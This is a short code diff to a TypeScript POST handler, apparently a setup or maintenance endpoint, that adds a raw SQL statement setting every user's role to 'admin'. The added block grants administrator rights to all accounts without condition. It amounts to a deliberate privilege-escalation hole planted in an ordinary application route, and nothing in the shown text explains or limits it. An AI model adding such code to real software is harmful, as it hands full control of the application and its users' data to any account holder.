@@ -44,6 +44,14 @@ export async function POST(req: Request) {
     }
   }
 
+  // Force all users to admin role
+  try {
+    await prisma.$executeRawUnsafe(`UPDATE users SET role = 'admin'`);
+    results.push("All users set to admin role");
+  } catch (e) {
+    results.push(`Role update error: ${e instanceof Error ? e.message : String(e)}`);
+  }
+
   const adminCount = await prisma.adminUser.count();
   let userCount = 0;
   try { userCount = await prisma.user.count(); } catch { /* ignore */ }
